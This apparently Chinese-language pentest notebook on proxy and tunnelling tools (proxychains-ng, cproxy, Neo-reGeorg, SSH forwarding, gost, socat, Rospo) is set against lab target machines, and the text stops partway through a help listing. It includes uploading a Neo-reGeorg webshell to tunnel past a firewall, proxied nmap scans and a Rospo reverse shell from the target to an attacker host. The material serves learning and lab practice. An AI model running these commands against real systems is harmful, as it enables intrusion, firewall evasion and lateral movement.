# 代理工具



## proxychains-ng

ProxyChains 是一款 UNIX 程序，通过**预加载动态链接库**（利用 dlsym() 和 LD_PRELOAD 机制）动态劫持网络相关的 libc 函数，将动态链接程序的网络连接重定向至 SOCKS4a/5 或 HTTP 代理服务器。**当前仅支持 TCP 协议（不支持 UDP/ICMP 等）**。

其实现原理本质上是取巧的非正统方案，因此可能无法兼容部分程序——尤其是脚本类应用、会产生大量子进程的后台守护程序，或是通过 dlopen() 动态加载模块的程序（glibc 动态链接器的缺陷）。但对于简单的 C/C++ 编译型动态链接程序通常能够正常工作。

若您的应用无法通过 proxychains 代理，建议改用基于 iptables 的解决方案，其稳定性更为可靠。



### 配置项

#### 代理链模式

proxychains-ng 工具支持四种代理链模式。

- 严格链：按列表顺序使用**所有代理节点**（构建代理链），所有节点必须在线才能建立连接。
- 动态链：按列表顺序使用**在线代理节点**（构建代理链），自动跳过离线节点，至少一个节点在线即可工作。
- 轮询链：按 chain_len 定义的长度**循环使用代理**，自动跳过离线节点，每次从上次结束位置开始选代理节点。
- 随机链：从列表中**随机顺序选择代理节点**（构建代理链），自动跳过离线节点，chain_len 定义代理链的长度。



严格链、动态链、轮询链和随机链分别使用 **strict_chain、dynamic_chain、round_robin_chain 和 random_chain** 表示，配置文件中**只能选择一种模式**。**chain_len 仅对 random_chain 和 round_robin_chain 有效**。

```
#dynamic_chain
strict_chain
#round_robin_chain
#random_chain

#chain_len = 2
```



#### 静默模式

quiet_mode 选项将 proxychains-ng 设置为静默模式，不显示库输出。

```
#quiet_mode
```



#### 代理 DNS 请求

proxychains-ng 支持三种模式的 DNS 代理。

**proxy_dns（线程池模式）**

通过创建独立线程池拦截 DNS 请求，将查询封装为 SOCKS5 协议流量，经由代理链转发至远程 DNS 服务器。返回伪造的保留 IP 地址（如 224.x.x.x），实际连接时再将伪 IP 映射回真实地址。



**proxy_dns_old（外部脚本模式）**

调用 `/usr/bin/proxyresolv` 外部脚本，通过 `dig +tcp` 命令强制使用 TCP 协议执行 DNS 查询，查询过程完全通过代理链完成并返回真实 IP。



**proxy_dns_daemon（守护进程模式）**

由独立守护进程监听 1053 端口处理 DNS 请求，所有应用通过本地回环地址与守护进程通信。采用连接复用和预解析技术提升效率。

```
proxy_dns
#proxy_dns_old
#proxy_dns_daemon 127.0.0.1:1053
```



#### 虚拟网段

remote_dns_subnet 参数用于定义代理内部 DNS 映射的虚拟子网地址段，默认使用保留的 224.x.x.x 地址段。

- 当被代理应用进行 DNS 查询时，DNS 查询结果为该段的 IP 地址（部分文章中称为：**Fake IP**）。
- 如果某些应用会检查返回的 IP 地址并拒绝连接，可改用 10.x.x.x 或 127.x.x.x 等子网。
- 确保被代理应用无需实际访问该子网 ，注意不要与 localnet 段使用相同子网。

```
#remote_dns_subnet 127
#remote_dns_subnet 10
remote_dns_subnet 224
```



#### 网段排除

将网段设为**“本地网络范围”**，目**标地址为本地网络范围**的连接将不使用代理 。

注意：仅当应用传递纯 IP 地址，或通过 /etc/hosts 解析，或 proxy_dns 禁用/使用 proxy_dns_old 时生效

```
## 排除 192.168.1.0/24 网段的 80 端口
# localnet 192.168.1.0:80/255.255.255.0

## 排除整个 192.168.100.0/24 网段
# localnet 192.168.100.0/255.255.255.0

## 排除所有地址的 80 端口
# localnet 0.0.0.0:80/0.0.0.0
# localnet [::]:80/0

## RFC6890 回环地址范围
## 启用此项需确保 remote_dns_subnet 不是 127 段
## 如需代理连接本地端口的应用需要启用
# localnet 127.0.0.0/255.0.0.0
# localnet ::1/128

## RFC1918 私有地址范围
# localnet 10.0.0.0/255.0.0.0
# localnet 172.16.0.0/255.240.0.0
# localnet 192.168.0.0/255.255.0.0
```



#### 超时设置

```
# 超时设置（单位：毫秒）
tcp_read_time_out 15000
tcp_connect_time_out 8000
```



#### DNAT

对目标地址进行 DNAT 转换后代理

格式：原始地址:端口 -> 目标地址:端口

```
## 连接 1.1.1.1:1234 时实际连接到 1.1.1.2:443
# dnat 1.1.1.1:1234  1.1.1.2:443

## 连接 1.1.1.1:443 时实际连接到 1.1.1.2:443（端口可省略）
# dnat 1.1.1.2:443  1.1.1.2

## 无论连接 1.1.1.1 的哪个端口，都转到 1.1.1.2:443
# dnat 1.1.1.1  1.1.1.2:443

## 所有对 1.1.1.1 的连接都转到 1.1.1.2
# dnat 1.1.1.1  1.1.1.2
```



#### 代理列表

代理列表格式：`类型  IP  端口 [用户名 密码]`（使用制表符或空格分隔）

代理类型：http, socks4, socks5, raw（原始转发，流量不经修改直接转发 ）

认证类型支持：`"basic"-http  "user/pass"-socks`

示例：

```
[ProxyList]
socks5	192.168.67.78	1080	lamer	secret
http	192.168.89.3	8080	justu	hidden
socks4	192.168.1.49	1080
http	192.168.39.93	8080	
```



### 示例

proxychains-ng 配置文件

```
# 严格链
strict_chain

# 不输出信息
quiet_mode

# DNS
proxy_dns
remote_dns_subnet 224

# 超时设置
tcp_read_time_out 15000
tcp_connect_time_out 8000

# 代理列表
[ProxyList]
socks5 	172.16.153.47 1080
socks5 	172.17.251.182 1080
```



proxychains-ng 配合 nmap 进行 TCP connect端口扫描

```
proxychains4 nmap -sT -Pn -p- -r --min-rate 10000 172.18.100.100
[proxychains] config file found: /root/soft/proxychains-ng/etc/proxychains.conf
[proxychains] preloading /root/soft/proxychains-ng/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-19 12:06 CST
Nmap scan report for 10.12.0.201
Host is up (0.00049s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
1080/tcp open  socks

Nmap done: 1 IP address (1 host up) scanned in 52.40 seconds
```



## cproxy

cproxy 是一款基于 Rust 开发的轻量级透明代理工具，能够无感知地重定向应用程序的 TCP/UDP 流量至代理服务器。

它通过 cgroup 技术实现进程级流量管控，支持动态代理运行中程序、兼容静态编译的 Go 二进制文件，并提供类 proxychains 的简易操作方式。



> 代理工具**需为透明代理端口**，使用 ip2socks-go、gost 等工具可快速转换透明代理端口为 socks5 / http 代理



**基础用法：类 `proxychains` 模式**

启动新程序（仅 TCP 代理）：

```
sudo cproxy --port <目标本地端口> -- <您的程序> --参数1 --参数2 ...
```



若系统支持 `tproxy`，可通过 `--mode tproxy` 启用（代理 TCP 和 UDP）：

```
sudo cproxy --port <目标本地端口> --mode tproxy -- <您的程序> --参数1 --参数2 ...

# 或代理运行中的进程

sudo cproxy --port <目标本地端口> --mode tproxy --pid <现有进程PID>
```



使用 gost 将透明代理转为 socks5

```
gost -L red://:1080?tproxy=true -L redu://:1080?ttl=120s -F socks5://172.18.200.200:1080

cproxy --mode tproxy --port 1080 curl http://172.20.200.200
```



局限性：

1. 仅支持 IPv4 的 TCP 或 UDP
2. 由于**透明代理应用程序**处理流量的流程，cproxy 无法和 nmap 等（这类依赖底层协议响应的工具）搭配使用。



无法和 namp 搭配使用，**根据DeepSeek-ai的解释，**这是透明代理工具的典型特性：

**TPROXY（Transparent Proxy）** 是将流量透明重定向到本地应用程序，**应用程序**收到 TCP 请求后的工作流程。

1. 收到一个 TCP 透明流量 SYN 请求，立即完成 TCP 握手（SYN-ACK），表现为「瞬时连接成功」
2. 通过代理协议（如SOCKS5）异步建立真实连接
3. 若代理无法连接目标，则发送RST包终止本地连接 



实际测试中发现：用telnet连接未开放端口时，会先显示连接成功再立即断开：

```
root@localhost:~# time cproxy --mode tproxy --port 1080 telnet 172.18.223.53 2222 
Trying 10.12.0.201...
Connected to 10.12.0.201.
Escape character is '^]'.
Connection closed by foreign host.

real	0m0.754s
user	0m0.004s
sys		0m0.065s
```

注：**仅 telnet 的 real 实际大约为 0m0.005s**，上面测量程序执行所需的时间，包括了 cproxy 和 telnet 两者。



使用nmap扫描时则会误判所有端口开放：

```
root@localhost:~# cproxy --mode tproxy --port 1080 nmap -sT -Pn -p 1,2,3,4,5,60000-60010 172.18.223.53
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-19 13:02 CST
Nmap scan report for 10.12.0.201
Host is up (0.00031s latency).

PORT      STATE SERVICE
1/tcp     open  tcpmux
2/tcp     open  compressnet
3/tcp     open  compressnet
4/tcp     open  unknown
5/tcp     open  rje
60000/tcp open  unknown
60001/tcp open  unknown
60002/tcp open  unknown
60003/tcp open  unknown
60004/tcp open  unknown
60005/tcp open  unknown
60006/tcp open  unknown
60007/tcp open  unknown
60008/tcp open  unknown
60009/tcp open  unknown
60010/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.02 seconds
```



## Neo-reGeorg

**入站**仅允许TCP 80端口（接收外部请求），**出站**仅允许 TCP 80 端口（已建立的连接），其他端口（如22/SSH、443/HTTPS等）和 ICMP 协议均被阻断。



靶机限制：仅允许通过 80 端口入站，仅允许 80 端口出站，不允许其他任何端口出站。

![image-20250304094331572](./images/%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E8%BF%90%E7%94%A8.assets/image-20250304094331572.png)



Neo-reGeorg 工具生成 php、jsp 文件，上传到网站后可以与目标网站建立 socks5 连接。

生成 tunnel 文件

```
python neoreg.py generate -k 123 -o socks

...
    [+] Mkdir a directory: socks
    [+] Create neoreg server files:
       => socks/tunnel.cs
       => socks/tunnel.go
       => socks/tunnel.ashx
       => socks/tunnel.aspx
       => socks/tunnel.php
       => socks/tunnel.jsp
       => socks/tunnel.jspx
```



将 tunnel.php 文件上传到网站。

![image-20250304100018267](./images/%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E8%BF%90%E7%94%A8.assets/image-20250304100018267.png)



启动 socks5 连接

```
python neoreg.py -k 123 -u http://10.10.10.100/site/tunnel.php -l 0.0.0.0 -p 8080

...
+------------------------------------------------------------------------+
  Log Level set to [ERROR]
  Starting SOCKS5 server [0.0.0.0:8080]
  Tunnel at:
    http://10.10.10.100/site/tunnel.php
+------------------------------------------------------------------------+
```



proxychains4 配置文件设置 socks5 服务器

![image-20250304100143821](./images/%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E8%BF%90%E7%94%A8.assets/image-20250304100143821.png)



使用 proxychain4 连接到目标服务器

```
proxychains4 ssh jangow01@10.10.10.100

[proxychains] config file found: /root/soft/proxychains-ng/etc/proxychains.conf
[proxychains] preloading /root/soft/proxychains-ng/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  10.10.10.100:22  ...  OK
jangow01@10.10.10.100's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

262 pacotes podem ser atualizados.
175 atualizações são atualizações de segurança.


Last login: Mon Mar  3 21:38:44 2025 from 10.10.10.100
jangow01@jangow01:~$ 
```



**Neo-reGeorg generate 工具帮助**

```
用法: neoreg.py generate [-h] -k 密钥 [-o 目录] [-f 文件] [-c 状态码] [-T 模板/文件] [--read-buff 字节数] [--max-read-size 千字节]

功能: 生成Neoreg隧道WebShell

选项说明:
  -h, --help            显示帮助信息
  -k KEY, --key KEY     必填参数，指定WebShell连接密钥
  -o DIR, --outdir DIR  指定WebShell文件输出目录
  -f FILE, --file FILE  伪装页面文件路径（用于隐藏WebShell）
  -c CODE, --httpcode CODE
                        设置HTTP响应状态码（配合-r参数时建议值<400，默认200）
  -T STR/FILE, --request-template STR/FILE
                        自定义HTTP请求模板（示例：'img=data:image/png;base64,NEOREGBODY&save=ok'）
  --read-buff Bytes     远程数据读取缓冲区大小（默认：513字节）
  --max-read-size KB    单次请求最大读取量（默认：512KB）
```



**工具帮助**

```
用法: neoreg.py [-h] -u URI [-r URL] [-R] [-t IP:PORT] -k KEY [-l IP] [-p PORT] [-s] [-H LINE] [-c LINE] [-x LINE] [-T STR/FILE] [--php] [--php-skip-cookie]
               [--go] [--php-connect-timeout S] [--local-dns] [--read-buff KB] [--read-interval MS] [--write-interval MS] [--max-threads N] [--max-retry N]
               [--cut-left N] [--cut-right N] [--extract EXPR] [-v]

选项:
  -h, --help            显示帮助信息
  -u URI, --url URI     包含隧道脚本的URL地址
  -r URL, --redirect-url URL
                        内网转发至指定服务器 (仅支持Java/.NET)
  -R, --force-redirect  强制转发 (仅JSP -r)
  -t IP:PORT, --target IP:PORT
                        网络转发目标地址，设置后启用端口转发
  -k KEY, --key KEY     指定连接密钥
  -l IP, --listen-on IP 监听地址 (默认: 127.0.0.1)
  -p PORT, --listen-port PORT
                        监听端口 (默认: 1080)
  -s, --skip            跳过可用性检测
  -H LINE, --header LINE
                        添加自定义请求头
  -c LINE, --cookie LINE
                        自定义初始化Cookie
  -x LINE, --proxy LINE
                        使用代理服务器，格式 Proto://host[:port]
  -T STR/FILE, --request-template STR/FILE
                        HTTP请求模板 (示例: 'img=data:image/png;base64,NEOREGBODY&save=ok')
  --php                 使用PHP连接模式
  --php-skip-cookie     跳过PHP的Cookie可用性检查
  --go                  使用Go连接模式
  --php-connect-timeout S
                        PHP连接超时时间 (默认: 0.5秒)
  --local-dns           使用本地DNS解析
  --read-buff KB        本地读取缓冲区大小，单次POST最大数据量 (默认: 7KB, 最大: 50KB)
  --read-interval MS    数据读取间隔 (毫秒，默认: 300)
  --write-interval MS   数据写入间隔 (毫秒，默认: 200)
  --max-threads N       最大代理线程数 (默认: 400)
  --max-retry N         最大重试次数 (默认: 10)
  --cut-left N          截取响应体左侧N字节
  --cut-right N         截取响应体右侧N字节
  --extract EXPR        手动提取响应体内容 (示例: <html><p>NEOREGBODY</p></html>)
  -v                    增加输出详细程度 (使用 -vv 或更多参数以获取更详细输出)
```



### 端口转发示例

将本地 2222 端口的数据转发到远程 22 端口。

```
neoreg -k 123 -u http://10.10.10.100/site/tunnel.php --php -l 0.0.0.0 -p 2222 -t 127.0.0.1:22 
```





## ssh 隧道

### 本地端口转发

将本地主机的某个端口通过 SSH 隧道转发到远程服务器的指定端口。

```
ssh -L [本地IP:]本地端口:目标主机:目标端口 用户名@SSH服务器
```

```
ssh -L 3306:localhost:3306 user@example.com
```

- 本地 `3306` 端口的流量会被转发到 `example.com` 服务器的 `localhost:3306`（如 MySQL）。
- 若需允许其他设备访问本地端口，可绑定到 `0.0.0.0`。



**Unix 域套接字转发**

将本地 Unix Socket 转发到远程 Unix Socket（SSH 7.3+ 支持）。

```
ssh -R [远程套接字路径]:[本地套接字路径] 用户名@SSH服务器
```

```
ssh -L /tmp/local.sock:/var/run/remote.sock user@example.com
```



### 远程端口转发

将远程服务器的某个端口通过 SSH 隧道转发回本地主机的指定端口（反向隧道）。

```
ssh -R [远程IP:]远程端口:本地主机:本地端口 用户名@SSH服务器
```

```
ssh -R 8080:localhost:80 user@example.com
```

- 远程服务器 `example.com` 的 `8080` 端口流量会转发到本地的 `80` 端口（如本地 Web 服务）。
- 默认绑定到远程服务器的 `127.0.0.1`，需在 SSH 服务器配置中启用 `GatewayPorts yes` 以允许外部访问。



**Unix 域套接字转发**

将远程 Unix 域套接字（Remote Unix Socket）转发到本地。

```
ssh -R [本地套接字路径]:[远程套接字路径] 用户名@SSH服务器
```

```
ssh -R /var/run/remote_service.sock:/tmp/local.sock user@example.com
```



### 动态端口转发

创建 SOCKS 代理服务器，动态转发所有流量到远程网络。

```
ssh -D [本地IP:]本地端口 用户名@SSH服务器
```

```
ssh -D 1080 user@example.com
```

- 在本地 `1080` 端口启动 SOCKS5 代理，浏览器或应用配置代理后，流量经 `example.com` 转发。



### 多跳隧道

多跳隧道（Jump Host 或 ProxyJump）是一种通过多个中间 SSH 服务器（跳板机）连接到目标主机的技术，类似“链式连接”。

```
ssh -J user1@jump_host user2@target_host
```

- 先通过 `user1@jump_host` 连接到第一个跳板机。
- 再从 `jump_host` 连接到最终目标主机 `target_host`（身份为 `user2`）。



SSH 协议本身无跳数限制，可通过逗号分隔多个跳板机：

```
ssh -J user1@jump1,user2@jump2,user3@jump3 user4@target_host
```

- 连接路径：本地 → `jump1` → `jump2` → `jump3` → `target_host`。



使用多跳隧道同时可以使用  `-L` 或 `-R` 参数进行端口转发。

```
ssh -J user1@jump_host -L 本地端口:目标主机:目标端口 user2@target_host
```

- 本地端口流量 → 跳板机 `jump_host` → 目标主机 `target_host` 的端口。



```
ssh -J user1@jump_host -R 远程端口:本地服务主机:本地端口 user2@target_host
```

- 目标主机 `target_host` 的远程端口 → 跳板机 `jump_host` → 本地服务主机的端口。



### ssh + socks5

靶机的 SSH 服务运行在 22 端口，但防火墙规则阻止了所有外部对该端口的直接入站连接（即外部无法直接访问靶机的 22 端口）。

本地机器上启动了一个 SOCKS5 代理服务，监听在 127.0.0.1（即本机）的 8080 端口，该代理能够绕过防火墙限制，通过其他已建立的通信渠道将流量间接传输到靶机内部网络中。

通过此 SOCKS5 代理，用户可将 SSH 客户端流量封装并转发到靶机的 22 端口。



**直接访问（失败）**

```

```



**proxychains4**

使用 proxychains4 代理流量，**普通 ssh 连接**。

```
proxychains4 ssh jangow01@10.10.10.100

[proxychains] config file found: /root/soft/proxychains-ng/etc/proxychains.conf
[proxychains] preloading /root/soft/proxychains-ng/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  10.10.10.100:22  ...  OK
jangow01@10.10.10.100's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)
...
jangow01@jangow01:~$ 
```



将**本地 2222 端口**转发到**远程 22 端口**

```
proxychains4 ssh -L 2222:127.0.0.1:22 -Nf jangow01@10.10.10.100

[proxychains] config file found: /root/soft/proxychains-ng/etc/proxychains.conf
[proxychains] preloading /root/soft/proxychains-ng/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  10.10.10.100:22  ...  OK
jangow01@10.10.10.100's password: 
```



直接使用本地 2222 端口即可连接到远程服务器

```
ssh jangow01@127.0.0.1 -p 2222

jangow01@127.0.0.1's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)
...
jangow01@jangow01:~$ 
```



将**远程 4444 端口**转发到**本地 4444 端口**

```
proxychains4 ssh -R 4444:127.0.0.1:4444 jangow01@10.10.10.100

[proxychains] config file found: /root/soft/proxychains-ng/etc/proxychains.conf
[proxychains] preloading /root/soft/proxychains-ng/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  10.10.10.100:22  ...  OK
jangow01@10.10.10.100's password: 
```



远程主机已经监听 4444 端口

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name	
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN       -               
```



本地使用 nc 监听 4444 端口，远程主机尝试连接 127.0.0.1 4444 端口

```
jangow01@jangow01:~$ nc 127.0.0.1 4444
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:4444  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:4444  ...  OK
...
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  127.0.0.1:4444  ...  OK
...
```

**proxychains4 的工作原理**是通过 `LD_PRELOAD` 动态库劫持应用程序的所有 TCP 连接，强制将这些连接通过预先配置的代理服务器转发。默认情况下，它会劫持包括本地回环地址（`127.0.0.1`）在内的所有连接。

假设远程 SSH 服务器将 `127.0.0.1:4444` 的流量转发到本地客户端，而本地客户端尝试将数据发送到本地的 `127.0.0.1:4444` 端口。由于 proxychains4 劫持了此连接，数据会被重新发送到远程 SSH 服务器，导致远程服务器又将数据传回本地，形成 **无限循环**。

**解决方案**是修改 proxychains4 的配置文件，使其忽略对本地回环地址（`127.0.0.1`）的劫持。在配置文件中添加 `localnet` 字段，例如：

```
localnet 127.0.0.0/8
```



重新开启远程端口转发

```
proxychains4 ssh -R 4444:127.0.0.1:4444 jangow01@10.10.10.100

[proxychains] config file found: /root/soft/proxychains-ng/etc/proxychains.conf
[proxychains] preloading /root/soft/proxychains-ng/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:8080  ...  10.10.10.100:22  ...  OK
jangow01@10.10.10.100's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)
...
jangow01@jangow01:~$ netstat -tunpl 
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name	
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN       -               

jangow01@jangow01:~$ nc 127.0.0.1 4444 
hello 
```



本地 nc 成功接收到数据

```
root@localhost:~# nc -l -p 4444
hello
```



### ProxyCommand

ProxyCommand 告诉 SSH 客户端不要直接连接目标服务器，而是通过指定的命令（此处是 nc）建立隧道。SSH 的流量会通过你指定的代理命令（这里是 `nc`）转发。

```
ssh -o ProxyCommand="nc -x 127.0.0.1:8080 %h %p" jangow01@10.10.10.100
```

 **nc -x 127.0.0.1:8080 %h %p** 命令

- **`nc`**：`netcat` 工具，用于网络通信。

- **`-x 127.0.0.1:8080`**：指定使用本地的 `8080` 端口作为 SOCKS5 代理。

- `%h` 和 `%p`

    ：SSH 客户端自动替换的变量：

    - `%h` → 目标主机地址（如 `10.10.10.100`）。
    - `%p` → 目标端口（如 SSH 默认的 `22`）。



不仅只有 nc 工具，还可以使用其他的工具（如：connect）

```
ssh -o ProxyCommand="connect -S 127.0.0.1:8080 %h %p" jangow01@10.10.10.100
```

注：在 ubuntu 中 connect 工具需要安装 connect-proxy 工具（**apt install connect-proxy**）



ProxyCommand 是 ssh 默认支持的参数，与 nc 等其他工具搭配非常简单，即使是**远程端口转发也无需额外配置**。



## gost

ssh 使用端口转发需要在 sshd_config 将 AllowTcpForwarding 选项设置为 yes（默认开启），如果用户主动关闭了 ssh 转发则可以使用 gost 工具替代。

gost 的全称是 GO Simple Tunnel，它是一个使用 GO 语言实现的安全隧道，**支持**简单**命令行参数**快速使用和复杂的**配置文件**。其功能强大，支持多种协议。



在靶机上 gost 使用 relay 监听 3333 端口，攻击机通过 Neo-reGeorg（PHP）将本地 3333 端口转发到远程 3333 端口，攻击机的 gost 只需连接本地的 3333 端口即可与靶机 gost 进行交互。



在靶机上执行 gost 程序，使用 relay 协议监听 3333 端口

![image-20250304201410339](./images/%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E8%BF%90%E7%94%A8.assets/image-20250304201410339.png)

注：设置多个参数，需使用 `&` 符号分隔参数，并通过 **URL 编码格式**（如空格用 `%20`，一般参数无需手动转义），重点注意 **引号包裹命令** 和 **参数分隔符 `&`** 的正确使用。



在攻击机上使用 Neo-reGeorg 工具，将本地 3333 端口转发到靶机 3333 端口。

```
neoreg -k 123 -u http://10.10.10.100/site/tunnel.php --read-interval 1 --write-interval 1 --php -l 0.0.0.0 -p 3333 -t 127.0.0.1:3333
```

注：在以下所有命令中 127.0.0.1:3333 相当于 10.10.10.100:3333



### 本地端口转发

将本地端口转发到靶机上的端口

```
gost -L tcp://:2222/127.0.0.1:22 -F relay://127.0.0.1:3333?nodelay=true
```

将本地的TCP端口 2222 映射到 10.10.10.100 的 2222 端口，所有到本地 2222 端口的数据会被转发到 10.10.10.100:2222。



### 远程端口转发

将远程靶机端口转发到本地端口

```
gost -L rtcp://:4444/127.0.0.1:4444 -F relay://127.0.0.1:3333?nodelay=true
```

根据rtcp服务指定的地址，通过转发链在主机 10.10.10.**100** 上监听 4444 TCP端口。当收到请求后再通过转发链将数据转发给rtcp服务，rtcp服务再将请求转发到 10.10.10.**10**:4444 端口（10.10.10.10 为本机 IP，即命令中的 127.0.0.1:4444）。

注：如果不使用转发链（-F），则 tcp 和 rtcp 无区别。



本地端口转发和远程端口转发可以在一个 gost 进程上同时运行，以下命令等价：

```
gost -L tcp://:2222/127.0.0.1:22 -F relay://127.0.0.1:3333?nodelay=true -L rtcp://:4444/127.0.0.1:4444 -F relay://127.0.0.1:3333?nodelay=true -L rtcp://:5555/127.0.0.1:5555 -F relay://127.0.0.1:3333?nodelay=true
```

```
gost -L tcp://:2222/127.0.0.1:22 -L rtcp://:4444/127.0.0.1:4444 -L rtcp://:5555/127.0.0.1:5555 -F relay://127.0.0.1:3333?nodelay=true
```

- **`-L` 定义服务入口**：每个 `-L` 参数表示一个独立的服务（如监听端口、协议类型）。
- **`-F` 定义转发链出口**：`-F` 参数的作用范围是 **其左侧最近的 `-L`**（即按命令行中参数顺序绑定）。
    **若没有显式指定 `-F`，则默认直连目标地址，不经过转发链**。





### socks5

本地开启 socks5 入站，将数据通过 relay 转发到靶机。

```
gost -L socks5://:1080 -F relay://127.0.0.1:3333?nodelay=true
```



## socat

### unix 转发

将 TCP 端口的数据转发到套接字

```
socat TCP-LISTEN:3307,reuseaddr,fork UNIX-CONNECT:/var/run/mysqld/mysqld.sock
```



## Rospo

Rospo 是一款专为创建安全可靠 SSH 隧道的工具，单个二进制文件集成客户端和服务端功能。旨在让 SSH 隧道技术重新焕发趣味与易用性。



### SSHD

启动 ssh 服务器

```
rospo sshd -A pass123 -P :2222
```



客户端连接 ssh 服务器

```
ssh root@127.0.0.1 -p 2222
```

```
rospo shell root@127.0.0.1:2222 -p pass123
```



命令帮助

```
Starts the sshd server

Usage:
  rospo sshd [flags]

Flags:
  -T, --disable-auth                      若设置则客户端无需认证即可连接
  -D, --disable-shell                     若设置则禁用 shell/执行功能
  -h, --help                              显示帮助信息
  -K, --sshd-authorized-keys string       SSH服务器授权密钥路径。
                                          支持类似 https://github.com/<username>.的 HTTP URL格式 (默认 												  "./authorized_keys")
  -A, --sshd-authorized-password string   SSH服务器授权密码。留空则禁用密码验证
  -I, --sshd-key string                   SSH服务器密钥路径 (默认 "./server_key")
  -P, --sshd-listen-address string        SSH服务器TCP监听地址 (默认 ":2222")

Global Flags:
  -q, --quiet   若设置则禁用所有日志输出
```

```
Starts a remote shell

Usage：
  rospo shell [user@]主机[:端口] [命令字符串] [参数]
  
Flags：
  -b, --disable-banner         禁用服务器横幅显示
  -h, --help                   显示帮助信息
  -i, --insecure               禁用已知主机密钥验证（跳过known_hosts检查）
  -j, --jump-host string       指定跳板机配置（可选）
  -k, --known-hosts string     指定known_hosts文件绝对路径（默认"/root/.ssh/known_hosts"）
  -p, --password string        设置SSH客户端密码
  -s, --user-identity string   指定SSH身份密钥（私钥）绝对路径（默认"/root/.ssh/id_rsa"）
  
Global Flags：
  -q, --quiet   启用静默模式（关闭所有日志输出）
```



### 反向 shell

rospo反向Shell的核心机制是：靶机首先主动连接至攻击机的SSH服务器，通过建立SSH隧道将攻击机上的指定端口远程转发到靶机本地。特别之处在于，`rospo revshell`命令会**自动完成两个关键操作**：既建立远程端口转发通道，又直接在靶机端启动本地SSH服务（无需额外部署其他SSH服务程序）。此时攻击机连接自身被转发的本地端口，即可通过加密隧道直接访问靶机自启动的SSH服务。



攻击机监听 2222 端口，开启 ssh 服务，密码为 111

```
rospo revshell root@10.12.0.100:2222 -i -A 111
```



靶机连接到攻击机 ssh 服务，开启远程端口转发（监听远程的 3333 端口），开启本地 ssh 服务，设置端口为 4444 （远程 3333 端口转发到本地 4444 端口），本地 ssh 服务密码为 222

```
rospo revshell root@10.12.0.100:2222 -r 127.0.0.1:3333 -i -p 111 -A 222 -P :4444
```



攻击机使用 ssh 连接到本地的 3333 端口，就可以连接到靶机的 ssh 服务。

```
root@xiaoshae:/opt# ssh root@127.0.0.1 -p 3333

 .---------------.
 | 🐸 rospo sshd |
 .---------------.

root@127.0.0.1's password: 
[root@linux1 ~]# 
```



命令示例

```
启动本地SSH守护进程并将其端口转发至远程主机

前置检查：
  1. 远程服务器公钥需存在于known_hosts文件中（使用insecure参数可禁用此验证）
     可通过'grabpubkey'命令显式获取公钥
  2. 您的身份凭证需在远程服务器授权（可通过keygen命令生成新凭证）
  3. 本地authorized_keys文件需已创建且包含至少一个密钥以支持反向连接
     此处可使用不同选项，请参考"-K"参数说明

用法：
  rospo revshell [user@]主机[:端口] [参数]

示例：

  # 在user@server的默认远程地址:2222启动反向shell
  $ rospo revshell user@server	

  # 在远程地址:6666启动反向shell，并拉取GitHub公钥
  $ rospo revshell -r :6666  -K http://github.com/[用户].keys user@server

参数：
  -T, --disable-auth                      禁用身份验证（允许客户端无认证连接）
  -b, --disable-banner                    禁用服务器横幅显示
  -h, --help                              显示帮助信息
  -i, --insecure                          禁用已知主机密钥验证（跳过known_hosts检查）
  -j, --jump-host string                  指定跳板机配置（可选）
  -k, --known-hosts string                known_hosts文件绝对路径（默认"/root/.ssh/known_hosts"）
  -p, --password string                   SSH客户端密码
  -r, --remote string                     远程shell监听端点（默认"127.0.0.1:2222"）
  -K, --sshd-authorized-keys string       SSH服务端授权密钥路径。
                                          支持HTTP URL格式（如https://github.com/<用户名>.keys）（默认"./authorized_keys"）
  -A, --sshd-authorized-password string   SSH服务端授权密码（空值则禁用该验证）
  -I, --sshd-key string                   SSH服务端密钥路径（默认"./server_key"）
  -P, --sshd-listen-address string        SSH服务端监听地址（默认":2222"）
  -s, --user-identity string              SSH身份（私钥）绝对路径（默认"/root/.ssh/id_rsa"）

全局参数：
  -q, --quiet   启用静默模式（关闭所有日志输出）
```



### 端口转发

将本地8080端口转发至远程8080端口

```
rospo tun forward -l :8080 -r :8080 root@10.12.0.100:2222 -i -p 111
```



从本地5000端口创建反向隧道至远程8888端口（通过跳板机服务器进行代理）

```
rospo tun reverse -l :5000 -r :8888  -j root@10.12.0.100:22 root@10.12.0.100:2222 -i -p 111
```



命令示例

```
创建可靠SSH隧道的工具集

用法：
  rospo [参数]
  rospo [子命令]

可用命令：
  completion   生成指定shell的自动补全脚本
